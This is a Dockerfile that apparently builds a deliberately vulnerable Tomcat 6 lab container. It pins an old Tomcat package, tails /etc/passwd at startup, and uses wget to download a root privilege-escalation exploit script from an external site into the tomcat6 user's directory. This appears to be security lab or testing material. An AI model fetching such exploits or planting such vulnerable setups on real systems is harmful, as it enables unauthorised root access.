FROM java5

ENV CATALINA_HOME /usr/share/tomcat6
ENV CATALINA_BASE /var/lib/tomcat6

RUN apt-get install tomcat6=6.0.39-1 tomcat6-common tomcat6-admin nano
RUN cd /var/lib/tomcat6 \
	&& ln -s /usr/share/java lib
RUN echo "#!/bin/bash" > /bin/startupTomcat.sh \
	&& echo "/etc/init.d/tomcat6 restart; sleep 2 && tail -f /etc/passwd" >> /bin/startupTomcat.sh
RUN chmod +x /bin/startupTomcat.sh

USER tomcat6
RUN mkdir /tmp/tomcat6 && mkdir /tmp/tomcat6/shared
WORKDIR /tmp/tomcat6
RUN wget http://legalhackers.com/exploits/tomcat-rootprivesc-deb.sh \
	&& chmod +x tomcat-rootprivesc-deb.sh

USER root

EXPOSE 8080

CMD ["/bin/startupTomcat.sh"]
